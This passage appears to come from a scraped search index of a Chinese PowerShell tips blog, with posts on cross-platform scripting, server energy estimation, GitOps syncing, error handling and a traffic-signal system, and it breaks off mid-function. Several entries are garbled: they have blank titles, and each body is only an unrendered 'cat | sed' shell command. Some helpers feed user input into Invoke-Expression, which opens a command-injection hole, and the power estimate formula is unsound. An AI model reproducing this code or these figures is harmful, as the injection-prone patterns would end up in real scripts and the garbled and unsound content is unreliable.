}}$platform = Get-CurrentPlatformWrite-Host &quot;当前运行平台: $platform&quot; 处理文件路径在不同操作系统上，文件路径的格式和分隔符有所不同。使用PowerShell提供的内置方法可以解决这个问题： 12345678910111213141516171819202122232425262728293031323334function Get-CrossPlatformPath { param( [string]$Path ) # 使用Join-Path确保路径分隔符正确 $normalizedPath = $Path # 处理根路径 if ($IsWindows -or ($PSVersionTable.PSVersion.Major -lt 6 -and $env:OS -eq &quot;Windows_NT&quot;)) { # 在Windows上，确保使用正确的驱动器表示法 if (-not $normalizedPath.Contains(':') -and $normalizedPath.StartsWith('/')) { $normalizedPath = &quot;C:$normalizedPath&quot; } } else { # 在Linux/macOS上，将Windows路径转换为Unix风格 if ($normalizedPath -match '^[A-Za-z]:') { $normalizedPath = $normalizedPath -replace '^[A-Za-z]:', '' $normalizedPath = $normalizedPath -replace '\\\\', '/' $normalizedPath = &quot;/$normalizedPath&quot; } } # 确保所有分隔符都是平台适用的 $normalizedPath = $normalizedPath -replace '[/\\\\]', [System.IO.Path]::DirectorySeparatorChar return $normalizedPath}# 示例$path = &quot;/temp/test.txt&quot;$platformPath = Get-CrossPlatformPath -Path $pathWrite-Host &quot;跨平台路径: $platformPath&quot; 执行平台特定命令有时候，我们需要根据不同的平台执行不同的命令： 1234567891011121314151617181920212223242526272829303132function Invoke-PlatformCommand { param( [string]$WindowsCommand, [string]$LinuxCommand, [string]$MacOSCommand ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { Write-Host &quot;执行Windows命令: $WindowsCommand&quot; -ForegroundColor Cyan Invoke-Expression -Command $WindowsCommand } &quot;Linux&quot; { Write-Host &quot;执行Linux命令: $LinuxCommand&quot; -ForegroundColor Green Invoke-Expression -Command $LinuxCommand } &quot;macOS&quot; { Write-Host &quot;执行macOS命令: $MacOSCommand&quot; -ForegroundColor Magenta Invoke-Expression -Command $MacOSCommand } default { Write-Error &quot;不支持的平台: $platform&quot; } }}# 示例：获取系统信息Invoke-PlatformCommand -WindowsCommand &quot;Get-ComputerInfo | Select-Object WindowsProductName, OsVersion&quot; ` -LinuxCommand &quot;uname -a&quot; ` -MacOSCommand &quot;system_profiler SPSoftwareDataType | grep 'System Version'&quot; 创建跨平台服务管理函数下面是一个管理服务的跨平台函数示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879function Manage-CrossPlatformService { param( [Parameter(Mandatory = $true)] [string]$ServiceName, [Parameter(Mandatory = $true)] [ValidateSet(&quot;Start&quot;, &quot;Stop&quot;, &quot;Restart&quot;, &quot;Status&quot;)] [string]$Action ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { switch ($Action) { &quot;Start&quot; { Start-Service -Name $ServiceName Write-Host &quot;已启动Windows服务 $ServiceName&quot; -ForegroundColor Green } &quot;Stop&quot; { Stop-Service -Name $ServiceName Write-Host &quot;已停止Windows服务 $ServiceName&quot; -ForegroundColor Yellow } &quot;Restart&quot; { Restart-Service -Name $ServiceName Write-Host &quot;已重启Windows服务 $ServiceName&quot; -ForegroundColor Cyan } &quot;Status&quot; { Get-Service -Name $ServiceName } } } &quot;Linux&quot; { switch ($Action) { &quot;Start&quot; { sudo systemctl start $ServiceName Write-Host &quot;已启动Linux服务 $ServiceName&quot; -ForegroundColor Green } &quot;Stop&quot; { sudo systemctl stop $ServiceName Write-Host &quot;已停止Linux服务 $ServiceName&quot; -ForegroundColor Yellow } &quot;Restart&quot; { sudo systemctl restart $ServiceName Write-Host &quot;已重启Linux服务 $ServiceName&quot; -ForegroundColor Cyan } &quot;Status&quot; { sudo systemctl status $ServiceName } } } &quot;macOS&quot; { switch ($Action) { &quot;Start&quot; { sudo launchctl load /Library/LaunchDaemons/$ServiceName.plist Write-Host &quot;已启动macOS服务 $ServiceName&quot; -ForegroundColor Green } &quot;Stop&quot; { sudo launchctl unload /Library/LaunchDaemons/$ServiceName.plist Write-Host &quot;已停止macOS服务 $ServiceName&quot; -ForegroundColor Yellow } &quot;Restart&quot; { sudo launchctl unload /Library/LaunchDaemons/$ServiceName.plist sudo launchctl load /Library/LaunchDaemons/$ServiceName.plist Write-Host &quot;已重启macOS服务 $ServiceName&quot; -ForegroundColor Cyan } &quot;Status&quot; { sudo launchctl list | grep $ServiceName } } } default { Write-Error &quot;不支持的平台: $platform&quot; } }}# 示例：服务管理# Manage-CrossPlatformService -ServiceName &quot;spooler&quot; -Action &quot;Status&quot; 创建跨平台进程管理函数下面是一个管理进程的跨平台函数： 1234567891011121314151617181920212223242526272829303132333435363738function Get-CrossPlatformProcess { param( [string]$Name = &quot;&quot; ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { if ($Name) { Get-Process -Name $Name -ErrorAction SilentlyContinue } else { Get-Process } } { $_ -in &quot;Linux&quot;, &quot;macOS&quot; } { if ($Name) { $processInfo = Invoke-Expression &quot;ps -ef | grep $Name | grep -v grep&quot; if ($processInfo) { $processInfo } else { Write-Host &quot;未找到名称包含 '$Name' 的进程。&quot; -ForegroundColor Yellow } } else { Invoke-Expression &quot;ps -ef&quot; } } default { Write-Error &quot;不支持的平台: $platform&quot; } }}# 示例：查找进程# Get-CrossPlatformProcess -Name &quot;pwsh&quot; 跨平台环境变量处理不同操作系统的环境变量处理方式有所不同，下面是一个统一的方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function Get-CrossPlatformEnvironmentVariable { param( [Parameter(Mandatory = $true)] [string]$Name ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { return [System.Environment]::GetEnvironmentVariable($Name) } { $_ -in &quot;Linux&quot;, &quot;macOS&quot; } { $value = Invoke-Expression &quot;echo `$${Name}&quot; return $value } default { Write-Error &quot;不支持的平台: $platform&quot; return $null } }}function Set-CrossPlatformEnvironmentVariable { param( [Parameter(Mandatory = $true)] [string]$Name, [Parameter(Mandatory = $true)] [string]$Value, [ValidateSet(&quot;Process&quot;, &quot;User&quot;, &quot;Machine&quot;)] [string]$Scope = &quot;Process&quot; ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { [System.Environment]::SetEnvironmentVariable($Name, $Value, $Scope) Write-Host &quot;已设置Windows环境变量 $Name=$Value (作用域: $Scope)&quot; -ForegroundColor Green } { $_ -in &quot;Linux&quot;, &quot;macOS&quot; } { # Linux/macOS只支持进程级别的即时设置 Invoke-Expression &quot;`$env:$Name = `&quot;$Value`&quot;&quot; # 如果需要永久设置，需要写入配置文件 if ($Scope -ne &quot;Process&quot;) { Write-Host &quot;在Linux/macOS上永久设置环境变量，需要添加到配置文件中:&quot; -ForegroundColor Yellow if ($Scope -eq &quot;User&quot;) { Write-Host &quot;添加 'export $Name=$Value' 到 ~/.profile 或 ~/.bash_profile&quot; -ForegroundColor Cyan } elseif ($Scope -eq &quot;Machine&quot;) { Write-Host &quot;添加 'export $Name=$Value' 到 /etc/profile 或 /etc/environment&quot; -ForegroundColor Cyan } } else { Write-Host &quot;已设置Linux/macOS环境变量 $Name=$Value (仅当前进程有效)&quot; -ForegroundColor Green } } default { Write-Error &quot;不支持的平台: $platform&quot; } }}# 示例：获取和设置环境变量# $path = Get-CrossPlatformEnvironmentVariable -Name &quot;PATH&quot;# Set-CrossPlatformEnvironmentVariable -Name &quot;TEST_VAR&quot; -Value &quot;TestValue&quot; -Scope &quot;Process&quot; 创建跨平台文件系统监控函数下面是一个监控文件系统变化的跨平台函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859function Start-CrossPlatformFileWatcher { param( [Parameter(Mandatory = $true)] [string]$Path, [string]$Filter = &quot;*.*&quot;, [switch]$IncludeSubdirectories ) $platform = Get-CurrentPlatform # 确保路径适合当前平台 $Path = Get-CrossPlatformPath -Path $Path # 创建FileSystemWatcher对象（适用于所有平台） $watcher = New-Object System.IO.FileSystemWatcher $watcher.Path = $Path $watcher.Filter = $Filter $watcher.IncludeSubdirectories = $IncludeSubdirectories # 定义事件处理程序 $action = { $event = $Event.SourceEventArgs $name = $event.Name $changeType = $event.ChangeType $timestamp = Get-Date -Format &quot;yyyy-MM-dd HH:mm:ss&quot; Write-Host &quot;[$timestamp] 文件 $name 已$changeType&quot; -ForegroundColor Green } # 注册事件 $handlers = @() $handlers += Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action $handlers += Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action $handlers += Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action $handlers += Register-ObjectEvent -InputObject $watcher -EventName Renamed -Action $action # 启用监控 $watcher.EnableRaisingEvents = $true Write-Host &quot;开始监控文件夹: $Path&quot; -ForegroundColor Cyan Write-Host &quot;按Ctrl+C停止监控...&quot; -ForegroundColor Yellow try { # 保持脚本运行 while ($true) { Start-Sleep -Seconds 1 } } finally { # 清理 $watcher.EnableRaisingEvents = $false $handlers | ForEach-Object { Unregister-Event -SubscriptionId $_.Id } $watcher.Dispose() Write-Host &quot;已停止监控.&quot; -ForegroundColor Cyan }}# 示例：监控目录变化# Start-CrossPlatformFileWatcher -Path &quot;/tmp&quot; -Filter &quot;*.txt&quot; -IncludeSubdirectories 实用的跨平台脚本模板下面是一个通用的跨平台脚本模板，您可以作为基础进行扩展： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#!/usr/bin/env pwsh&lt;#.SYNOPSIS 跨平台PowerShell脚本模板。.DESCRIPTION 这是一个在Windows、Linux和macOS上都能正常运行的PowerShell脚本模板。.PARAMETER Action 要执行的操作。.EXAMPLE ./cross-platform-script.ps1 -Action &quot;CheckSystem&quot;#&gt;param( [Parameter(Mandatory = $true)] [ValidateSet(&quot;CheckSystem&quot;, &quot;ListFiles&quot;, &quot;GetProcesses&quot;)] [string]$Action)# 平台检测function Get-CurrentPlatform { if ($IsWindows -or ($PSVersionTable.PSVersion.Major -lt 6 -and $env:OS -eq &quot;Windows_NT&quot;)) { return &quot;Windows&quot; } elseif ($IsLinux) { return &quot;Linux&quot; } elseif ($IsMacOS) { return &quot;macOS&quot; } else { return &quot;Unknown&quot; }}# 平台特定命令执行function Invoke-PlatformCommand { param( [string]$WindowsCommand, [string]$LinuxCommand, [string]$MacOSCommand ) $platform = Get-CurrentPlatform switch ($platform) { &quot;Windows&quot; { if ($WindowsCommand) { return Invoke-Expression -Command $WindowsCommand } } &quot;Linux&quot; { if ($LinuxCommand) { return Invoke-Expression -Command $LinuxCommand } } &quot;macOS&quot; { if ($MacOSCommand) { return Invoke-Expression -Command $MacOSCommand } } default { Write-Error &quot;不支持的平台: $platform&quot; return $null } }}# 主函数function Main { $platform = Get-CurrentPlatform Write-Host &quot;当前平台: $platform&quot; -ForegroundColor Cyan switch ($Action) { &quot;CheckSystem&quot; { Write-Host &quot;系统信息:&quot; -ForegroundColor Green switch ($platform) { &quot;Windows&quot; { Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsName } &quot;Linux&quot; { $osInfo = Invoke-Expression &quot;cat /etc/os-release&quot; $hostname = Invoke-Expression &quot;hostname&quot; Write-Host &quot;主机名: $hostname&quot; Write-Host $osInfo } &quot;macOS&quot; { $osInfo = Invoke-Expression &quot;sw_vers&quot; $hostname = Invoke-Expression &quot;hostname&quot; Write-Host &quot;主机名: $hostname&quot; Write-Host $osInfo } } } &quot;ListFiles&quot; { $currentDir = Get-Location Write-Host &quot;当前目录 ($currentDir) 的文件:&quot; -ForegroundColor Green Get-ChildItem | Select-Object Name, Length, LastWriteTime } &quot;GetProcesses&quot; { Write-Host &quot;运行中的进程:&quot; -ForegroundColor Green switch ($platform) { &quot;Windows&quot; { Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10 Name, CPU, WorkingSet } { $_ -in &quot;Linux&quot;, &quot;macOS&quot; } { Invoke-Expression &quot;ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%cpu | head -11&quot; } } } }}# 执行主函数Main 最佳实践总结 始终检测平台：使用$IsWindows、$IsLinux和$IsMacOS变量确定当前平台。 使用内置路径处理：利用Join-Path、Split-Path和[System.IO.Path]类处理跨平台路径。 避免硬编码路径分隔符：使用[System.IO.Path]::DirectorySeparatorChar代替硬编码的\\或/。 利用条件逻辑：为不同平台编写特定的代码分支。 使用.NET Core的跨平台API：尽可能使用.NET Core提供的跨平台API而不是平台特定命令。 测试、测试再测试：在所有目标平台上测试您的脚本。 通过遵循这些技巧和最佳实践，您可以编写出在所有主要操作系统上都能无缝运行的PowerShell脚本，充分发挥PowerShell跨平台能力的优势。","link":"/2025/01/21/powershell-cross-platform-scripting/"},{"title":"PowerShell实现数据中心能耗优化","text":"123456789101112131415161718192021222324252627function Get-EnergyConsumption { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ServerName ) $cpuUsage = (Get-Counter -ComputerName $ServerName '\\Processor(_Total)\\% Processor Time').CounterSamples.CookedValue $memoryUsage = (Get-Counter -ComputerName $ServerName '\\Memory\\Available MBytes').CounterSamples.CookedValue # 计算能耗估算（基于Intel Xeon处理器能效模型） $energyCost = [math]::Round(($cpuUsage * 0.7) + ($memoryUsage * 0.05), 2) [PSCustomObject]@{ ServerName = $ServerName Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') CPUUsage = &quot;$cpuUsage%&quot; MemoryAvailable = &quot;${memoryUsage}MB&quot; EstimatedPower = &quot;${energyCost}W&quot; OptimizationSuggestion = if ($cpuUsage -lt 30) {'建议启用节能模式'} else {'建议优化负载分配'} }}# 监控服务器集群'SRV01','SRV02','SRV03' | ForEach-Object { Get-EnergyConsumption -ServerName $_ -Verbose} | Export-Csv -Path &quot;Energy_Report_$(Get-Date -Format yyyyMMdd).csv&quot; 核心功能： 实时监控服务器CPU/内存使用率 基于能效模型估算功耗 生成节能优化建议 扩展方向： 集成IPMI接口获取实际功耗 添加自动电源模式调整功能 与Kubernetes集成实现智能调度","link":"/2025/01/22/green-computing-optimization/"},{"title":"PowerShell 技能连载 - GitOps自动化部署","text":"在GitOps实践中，实现配置即代码的自动化部署流程。以下脚本实现Git仓库与Kubernetes集群的自动同步： 12345678910111213141516171819202122232425262728293031323334353637function Sync-GitOpsDeployment { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$RepoUrl, [ValidateSet('dev','prod')] [string]$Environment = 'dev' ) $workdir = Join-Path $env:TEMP &quot;gitops-$(Get-Date -Format 'yyyyMMddHHmmss')&quot; try { # 克隆配置仓库 git clone $RepoUrl $workdir # 应用环境配置 $manifests = Get-ChildItem -Path $workdir/$Environment -Filter *.yaml $manifests | ForEach-Object { kubectl apply -f $_.FullName } # 生成同步报告 [PSCustomObject]@{ Timestamp = Get-Date SyncedFiles = $manifests.Count Environment = $Environment CommitHash = (git -C $workdir rev-parse HEAD) } } catch { Write-Error &quot;GitOps同步失败: $_&quot; } finally { Remove-Item $workdir -Recurse -Force -ErrorAction SilentlyContinue }} 实现原理： 临时克隆Git仓库获取最新配置 按环境目录筛选Kubernetes清单文件 使用kubectl批量应用资源配置 生成包含提交哈希的同步报告 自动清理临时工作目录 使用示例： 1Sync-GitOpsDeployment -RepoUrl 'https://github.com/user/config-repo' -Environment 'prod' 最佳实践： 与Webhook集成实现变更触发 添加配置差异比对功能 实现同步历史版本追溯 集成通知机制报告异常 注意事项：• 需要配置git和kubectl命令行工具• 生产环境建议使用SSH密钥认证• 重要变更应通过PR流程审核","link":"/2025/01/24/powershell-gitops-automation/"},{"title":"","text":"$(cat _posts/2025-01-27-powershell-metaverse-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/27/powershell-metaverse-management/"},{"title":"PowerShell 异常处理完全指南","text":"结构化异常捕获123456789101112131415161718try { # 可能失败的操作 Get-Content -Path '不存在的文件.txt' -ErrorAction Stop Invoke-RestMethod -Uri 'http://无效域名'}catch [System.IO.FileNotFoundException] { Write-Warning &quot;文件未找到: $($_.Exception.ItemName)&quot;}catch [System.Net.WebException] { Write-Warning &quot;网络错误: $($_.Exception.Status)&quot;}catch { Write-Error &quot;未捕获的异常: $_&quot;}finally { # 清理资源 Remove-Variable -Name '*temp*' -ErrorAction SilentlyContinue} 错误处理模式 终止错误：使用-ErrorAction Stop强制转换 非终止错误：通过$Error自动变量追踪 类型过滤：catch块支持.NET异常类型匹配 错误记录：$Error[0]获取最近异常详细信息 最佳实践 在函数内使用throw生成可预测异常 避免空catch块吞噬异常 使用-ErrorVariable参数捕获错误对象 通过$ErrorView控制错误显示格式","link":"/2025/01/28/powershell-error-handling/"},{"title":"","text":"$(cat _posts/2025-01-30-powershell-module-development.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/30/powershell-module-development/"},{"title":"","text":"$(cat _posts/2025-01-31-powershell-energy-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/31/powershell-energy-management/"},{"title":"","text":"$(cat _posts/2025-02-03-powershell-variable-scopes.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/03/powershell-variable-scopes/"},{"title":"","text":"$(cat _posts/2025-02-04-powershell-retail-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/04/powershell-retail-integration/"},{"title":"PowerShell blog post collection (2023-04 ~ 2024-03)","text":"2023 年 04 月 2023-04-11 使用 PowerShell 解决问题（第 4 部分） 2023-04-13 更丰富的打印机信息 2023-04-17 PowerShell 废弃功能 (第 1 部分：PowerShell 2.0) 2023-04-19 PowerShell 废弃功能（第 2 部分：Exchange Online 中的远程 PowerShell (RPS)） 2023-04-21 常见陷阱和奇怪结果：比较运算符 2023-04-25 重命名属性（简单方法） 2023-04-27 Office365邮箱恢复删除（第 1 部分） 2023 年 05 月 2023-05-01 列出所有域控制器 2023-05-01 永久删除硬盘内容 2023-05-01 Office365邮箱恢复删除（第 2 部分） 2023-05-03 彻底删除硬盘数据 2023-05-05 列出所有域控制器 2023-05-09 列出活动的域控制器 2023-05-11 进度条技巧（第 1 部分） 2023-05-13 进度条技巧（第 2 部分） 2023-05-17 进度条技巧（第 3 部分） 2023-05-19 进度条技巧（第 4 部分） 2023-05-21 创建 ISO 文件 2023-05-23 创建 ISO 文件 2023-05-25 挂载 ISO 文件 2023-05-29 两种类型转换（和一个 bug） 2023-05-31 Invoke-RestMethod 退出错误 2023 年 06 月 2023-06-02 获取父级文化 2023-06-06 SpeculationControl：使用 PowerShell 检查风险 2023-06-08 测试驱动 PowerShellGet 版本 3 2023-06-15 7个用于管理DHCP的最佳PowerShell脚本 2023-06-29 选择最适当的文件格式（第 1 部分） 2023 年 07 月 2023-07-04 学习在Powershell中使用管道的3种有效方法 2023-07-05 选择最佳的文件格式（第 3 部分） 2023-07-07 选择最佳的文件格式（第 4 部分） 2023-07-11 PowerShell 脚本未经确认无法运行 2023-07-13 从 DateTime 中生成日期 2023-07-17 星座计算器（又称“Sternzeichen”） 2023-07-19 避免使用 Get-EventLog 2023-07-21 轻松过渡至 Get-WinEvent 2023-07-25 自动化控制面板 2023-07-27 带有掩码的输入 2023-07-31 管理文件共享 2023 年 08 月 2023-08-02 识别未正确加密的 AD 账户 2023-08-04 Microsoft Graph PowerShell 社区示例页面 2023-08-08 寻找开始时间退化 2023-08-10 10个每个人都应该知道的有用PowerShell命令 2023-08-10 获取德国节日 2023-08-14 Windows 系统的温度控制 2023-08-20 理解PowerShell中的错误处理 2023-08-24 获取法国假期 2023 年 09 月 2023-09-01 PowerShell函数的手把手指南 2023-09-09 PowerShell 过滤器：使用 Where-Object 和 Select-Object 2023 年 10 月 2023-10-21 理解 PowerShell 执行策略：初学者指南 2023 年 11 月 2023-11-01 轻松掌握PowerShell中的ErrorAction 2024 年2024 年 01 月 2024-01-11 PowerCLI: The Easy Way To Manage VMware 2024 年 02 月 2024-02-15 使用 PowerShell 自动化 Windows 11 任务：实用指南 2024 年 03 月 2024-03-05 25个最佳的Powershell脚本仓库 2024-03-05 7 个用于管理 DHCP 的最佳 PowerShell 脚本 2024-03-09 针对Windows服务器的4种强大的PowerShell安全技术 2024-03-20 管理 DNS 的 8 个最佳 Powershell 脚本 2024-03-23 15个最佳的Active Directory Powershell脚本","link":"/2025/02/05/blog-index/"},{"title":"","text":"$(cat _posts/2025-02-05-powershell-configuration-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/05/powershell-configuration-management/"},{"title":"","text":"$(cat _posts/2025-02-06-powershell-object-properties.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的对象处理。PowerShell是一种面向对象的语言，几乎所有操作都涉及创建、修改或处理对象。通过理解PowerShell的对象模型，可以更有效地操作数据和系统资源，执行复杂的任务。\\n/}pd}p’)","link":"/2025/02/06/powershell-object-properties/"},{"title":"","text":"$(cat _posts/2025-02-07-powershell-json-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2025/02/07/powershell-json-processing/"},{"title":"","text":"$(cat _posts/2025-02-10-powershell-zero-trust-security.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/10/powershell-zero-trust-security/"},{"title":"PowerShell 技能连载 - 智能交通管理系统","text":"在智能交通领域，系统化管理对于提高交通效率和安全性至关重要。本文将介绍如何使用PowerShell构建一个智能交通管理系统，包括交通流量监控、信号灯控制、事故处理等功能。 交通流量监控首先，让我们创建一个用于监控交通流量的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143function Monitor-TrafficFlow { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$IntersectionID, [Parameter()] [string[]]$Lanes, [Parameter()] [int]$SamplingInterval = 60, [Parameter()] [string]$DataPath, [Parameter()] [hashtable]$Thresholds ) try { $monitor = [PSCustomObject]@{ IntersectionID = $IntersectionID StartTime = Get-Date Lanes = @{} Alerts = @() Statistics = @{} } while ($true) { $sampleTime = Get-Date foreach ($lane in $Lanes) { $laneData = [PSCustomObject]@{ LaneID = $lane SampleTime = $sampleTime VehicleCount = 0 AverageSpeed = 0 Occupancy = 0 Status = &quot;Normal&quot; Alerts = @() } # 获取车道数据 $sensors = Get-LaneSensors -IntersectionID $IntersectionID -Lane $lane foreach ($sensor in $sensors) { $laneData.$($sensor.Type) = $sensor.Value } # 检查阈值 if ($Thresholds) { # 检查车辆数量 if ($Thresholds.ContainsKey(&quot;VehicleCount&quot;)) { $threshold = $Thresholds.VehicleCount if ($laneData.VehicleCount -gt $threshold.Max) { $laneData.Status = &quot;Congested&quot; $laneData.Alerts += [PSCustomObject]@{ Time = $sampleTime Type = &quot;HighTraffic&quot; Value = $laneData.VehicleCount Threshold = $threshold.Max } } } # 检查平均速度 if ($Thresholds.ContainsKey(&quot;AverageSpeed&quot;)) { $threshold = $Thresholds.AverageSpeed if ($laneData.AverageSpeed -lt $threshold.Min) { $laneData.Status = &quot;Slow&quot; $laneData.Alerts += [PSCustomObject]@{ Time = $sampleTime Type = &quot;LowSpeed&quot; Value = $laneData.AverageSpeed Threshold = $threshold.Min } } } # 检查占用率 if ($Thresholds.ContainsKey(&quot;Occupancy&quot;)) { $threshold = $Thresholds.Occupancy if ($laneData.Occupancy -gt $threshold.Max) { $laneData.Status = &quot;Blocked&quot; $laneData.Alerts += [PSCustomObject]@{ Time = $sampleTime Type = &quot;HighOccupancy&quot; Value = $laneData.Occupancy Threshold = $threshold.Max } } } } $monitor.Lanes[$lane] = $laneData # 处理告警 foreach ($alert in $laneData.Alerts) { $monitor.Alerts += $alert # 记录数据 if ($DataPath) { $laneData | ConvertTo-Json | Out-File -FilePath $DataPath -Append } # 发送告警通知 Send-TrafficAlert -Alert $alert } # 更新统计信息 if (-not $monitor.Statistics.ContainsKey($lane)) { $monitor.Statistics[$lane] = [PSCustomObject]@{ TotalVehicles = 0 AverageSpeed = 0 PeakHour = @{ Hour = 0 Count = 0 } } } $stats = $monitor.Statistics[$lane] $stats.TotalVehicles += $laneData.VehicleCount $stats.AverageSpeed = ($stats.AverageSpeed + $laneData.AverageSpeed) / 2 $currentHour = $sampleTime.Hour if ($laneData.VehicleCount -gt $stats.PeakHour.Count) { $stats.PeakHour = @{ Hour = $currentHour Count = $laneData.VehicleCount } } } Start-Sleep -Seconds $SamplingInterval } return $monitor } catch { Write-Error &quot;交通流量监控失败：$_&quot; return $null }} 信号灯控制接下来，创建一个用于控制交通信号灯的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140function Manage-TrafficSignals { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$IntersectionID, [Parameter()] [hashtable]$Timing, [Parameter()] [hashtable]$FlowData, [Parameter()] [switch]$Adaptive, [Parameter()] [string]$EmergencyVehicle, [Parameter()] [string]$LogPath ) try { $controller = [PSCustomObject]@{ IntersectionID = $IntersectionID StartTime = Get-Date Signals = @{} Status = &quot;Normal&quot; Actions = @() } # 获取信号灯状态 $signals = Get-TrafficSignals -IntersectionID $IntersectionID foreach ($signal in $signals) { $controller.Signals[$signal.ID] = [PSCustomObject]@{ SignalID = $signal.ID CurrentState = $signal.State Duration = $signal.Duration NextChange = $signal.NextChange Status = &quot;Active&quot; } } # 处理紧急车辆 if ($EmergencyVehicle) { $emergencyInfo = Get-EmergencyVehicleInfo -VehicleID $EmergencyVehicle if ($emergencyInfo.Priority -eq &quot;High&quot;) { $controller.Status = &quot;Emergency&quot; $action = Set-EmergencySignal -IntersectionID $IntersectionID -VehicleID $EmergencyVehicle $controller.Actions += $action # 记录紧急情况 if ($LogPath) { $emergencyLog = [PSCustomObject]@{ Time = Get-Date Type = &quot;Emergency&quot; VehicleID = $EmergencyVehicle Priority = $emergencyInfo.Priority Action = $action } $emergencyLog | ConvertTo-Json | Out-File -FilePath $LogPath -Append } } } # 自适应控制 if ($Adaptive -and $FlowData) { foreach ($signal in $controller.Signals.Values) { $laneData = $FlowData[$signal.SignalID] if ($laneData) { # 计算最优配时 $optimalTiming = Calculate-OptimalTiming -LaneData $laneData # 更新信号配时 if ($optimalTiming.Duration -ne $signal.Duration) { $action = Update-SignalTiming ` -SignalID $signal.SignalID ` -Duration $optimalTiming.Duration ` -Reason &quot;Adaptive Control&quot; $controller.Actions += $action # 记录配时调整 if ($LogPath) { $timingLog = [PSCustomObject]@{ Time = Get-Date Type = &quot;TimingAdjustment&quot; SignalID = $signal.SignalID OldDuration = $signal.Duration NewDuration = $optimalTiming.Duration Reason = &quot;Adaptive Control&quot; } $timingLog | ConvertTo-Json | Out-File -FilePath $LogPath -Append } } } } } # 应用固定配时 elseif ($Timing) { foreach ($signalID in $Timing.Keys) { $signalTiming = $Timing[$signalID] if ($controller.Signals.ContainsKey($signalID)) { $signal = $controller.Signals[$signalID] # 更新信号配时 if ($signalTiming.Duration -ne $signal.Duration) { $action = Update-SignalTiming ` -SignalID $signalID ` -Duration $signalTiming.Duration ` -Reason &quot;Fixed Timing&quot; $controller.Actions += $action # 记录配时调整 if ($LogPath) { $timingLog = [PSCustomObject]@{ Time = Get-Date Type = &quot;TimingAdjustment&quot; SignalID = $signalID OldDuration = $signal.Duration NewDuration = $signalTiming.Duration Reason = &quot;Fixed Timing&quot; } $timingLog | ConvertTo-Json | Out-File -FilePath $LogPath -Append } } } } } # 更新控制器状态 $controller.EndTime = Get-Date 